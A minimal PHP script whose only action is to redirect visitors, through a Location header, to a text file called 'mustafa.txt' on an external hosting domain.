<?php

   header( 'Location: http://subdr.onlinewebshop.net/mustafa.txt' ) ;

?>